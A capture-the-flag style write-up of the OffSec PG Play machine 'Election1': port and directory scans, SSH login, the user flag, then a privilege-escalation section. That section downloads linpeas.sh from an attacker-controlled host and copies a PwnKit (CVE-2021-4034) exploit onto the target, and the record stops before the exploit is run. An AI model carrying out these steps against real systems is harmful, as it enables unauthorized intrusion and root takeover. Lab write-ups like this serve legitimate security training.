---
title: "Election1"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
status: "Done"
difficulty: "Medium"
date: 2026-07-13
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 39c759b9275180f9ab79d745abf10e92
---

# Election1

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- --min-rate=1000 -oA nmap/election1 192.168.131.211
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 06:11 -0400
Nmap scan report for 192.168.131.211
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.42 seconds
                                                                
```

## Fuzzing Directories

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.131.211/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.131.211/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 86ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 7662ms]
election                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 72ms]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 72ms]
phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 75ms]
robots.txt              [Status: 200, Size: 30, Words: 1, Lines: 5, Duration: 74ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 94ms]
:: Progress: [20481/20481] :: Job [1/1] :: 502 req/sec :: Duration: [0:00:52] :: Errors: 0 ::

```

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.131.211/election/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.131.211/election/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 76ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 76ms]
admin                   [Status: 200, Size: 8964, Words: 851, Lines: 130, Duration: 86ms]
data                    [Status: 200, Size: 767, Words: 52, Lines: 16, Duration: 84ms]
js                      [Status: 200, Size: 990, Words: 65, Lines: 17, Duration: 72ms]
languages               [Status: 200, Size: 1366, Words: 89, Lines: 19, Duration: 73ms]
lib                     [Status: 200, Size: 968, Words: 64, Lines: 17, Duration: 81ms]
media                   [Status: 200, Size: 1755, Words: 109, Lines: 21, Duration: 77ms]
themes                  [Status: 200, Size: 965, Words: 64, Lines: 17, Duration: 82ms]
:: Progress: [20481/20481] :: Job [1/1] :: 505 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
                                                                                             
```

![[attachments/Offsec PG Play/Election1/image.png]]

![[attachments/Offsec PG Play/Election1/image 1.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ ssh love@192.168.131.211
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
love@192.168.131.211's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

471 packages can be updated.
358 updates are security updates.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
love@election:~$ 

```

## User Flag

```bash
love@election:~$ cd /home
love@election:/home$ ls
love
love@election:/home$ cd love/
love@election:~$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
love@election:~$ cat local.txt 
b61c54565ea8414bb83f21d2c5898010

```

## Privilege Esc

```bash
love@election:~$ cd /tmp
love@election:/tmp$ wget http://192.168.45.205:8000/linpeas.h
--2026-07-13 16:12:39--  http://192.168.45.205:8000/linpeas.h
Connecting to 192.168.45.205:8000... connected.
HTTP request sent, awaiting response... 404 File not found
2026-07-13 16:12:39 ERROR 404: File not found.

love@election:/tmp$ wget http://192.168.45.205:8000/linpeas.sh
--2026-07-13 16:12:41--  http://192.168.45.205:8000/linpeas.sh
Connecting to 192.168.45.205:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                 100%[=======================================================================================>]   1.01M   663KB/s    in 1.6s    

2026-07-13 16:12:43 (663 KB/s) - ‘linpeas.sh’ saved [1063041/1063041]

```

```bash
tr
```

![[attachments/Offsec PG Play/Election1/image 2.png]]

```bash
┌──(kali㉿kali)-[~/CVEs]
└─$ scp -r CVE-2021-4034 love@192.168.131.211:/tmp 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
love@192.168.131.211's password: 
linpeas.txt                                                                                                                              100%  356KB 472.9KB/s   00:00    
LICENSE                                                                                                                                  100% 1071    11.7KB/s   00:00    
HEAD                                                                                                                                     100%   21     0.2KB/s   00:00    
main                                                                                                                                     100%   41     0.5KB/s   00:00    
HEAD                                                                                                                                     100%   30     0.3KB/s   00:00    
config                                                                                                                                   100%  264     3.0KB/s   00:00    
HEAD                                                                                                                                     100%  179     2.1KB/s   00:00    
main                                                                                                                                     100%  179     2.1KB/s   00:00    
HEAD                                                                                                                                     100%  179     2.1KB/s   00:00    
description                                                                                                                              100%   73     0.7KB/s   00:00    
packed-refs                                                                                                                              100%  112     1.3KB/s   00:00    
pack-fe627aee9168f6e4d6bffbedd5489c8759a385f4.pack                                                                                       100%   23KB 268.4KB/s   00:00    
pack-fe627aee9168f6e4d6bffbedd5489c8759a385f4.rev                                                                                        100%  420     5.0KB/s   00:00    
pack-fe627aee9168f6e4d6bffbedd5489c8759a385f4.idx                                                                                        100% 3648    42.5KB/s   00:00    
index                                                                                                                                    100%  890    10.3KB/s   00:00    
sendemail-validate.sample                                                                                                                100% 2308    26.4KB/s   00:00    
prepare-commit-msg.sample                                                                                                                100% 1492    15.6KB/s   00:00    
pre-receive.sample                                                                                                                       100%  544     6.2KB/s   00:00    
applypatch-msg.sample                                                                                                                    100%  478     5.7KB/s   00:00    
pre-merge-commit.sample                                                                                                                  100%  416     4.4KB/s   00:00    
pre-commit.sample                                                                                                                        100% 1649    19.0KB/s   00:00    
fsmonitor-watchman.sample                                                                                                                100% 4726    54.1KB/s   00:00    
push-to-checkout.sample                                                                                                                  100% 2783    32.0KB/s   00:00    
update.sample                                                                                                                            100% 3650    38.6KB/s   00:00    
pre-push.sample                                                                                                                          100% 1374    16.2KB/s   00:00    
commit-msg.sample                                                                                                                        100%  896    10.3KB/s   00:00    
pre-rebase.sample                                                                                                                        100% 4898    55.9KB/s   00:00    
post-update.sample                                                                                                                       100%  189     2.2KB/s   00:00    
pre-applypatch.sample                                                                                                                    100%  424     4.8KB/s   00:00    
exclude                                                                                                                                  100%  240     2.6KB/s   00:00    
Makefile                                                                                                                                 100%  469     5.3KB/s   00:00    
README.md                                                                                                                                100% 3419    39.3KB/s   00:00    
gconv-modules                                                                                                                            100%   33     0.4KB/s   00:00    
cve-2021-4034.sh                                                                                                                         100%  305     3.3KB/s   00:00    
pwnkit.so:.                                                                                                                              100%   42KB 241.8KB/s   00:00    
.gitignore                                                                                                                               100%  114     1.3KB/s   00:00    
pwnkit.so                                                                                                                                100%   15KB 175.2KB/s   00:00    
dry-run-cve-2021-4034.c                                                                                                                  100% 3101    35.4KB/s   00:00    
Makefile                                                                                                                                 100%  575     6.6KB/s   00:00    
pwnkit-dry-run.c                                                                                                                         100%  258     3.0KB/s   00:00    
pwnkit.c                                                                                                                                 100%  339     3.9KB/s   00:00    
cve-2021-4034                                                                                                                            100%   16KB 183.1KB/s   00:00    
cve-2021-4034.c                                                                                                                          100%  292     3.5KB/s   00:00                                    
```
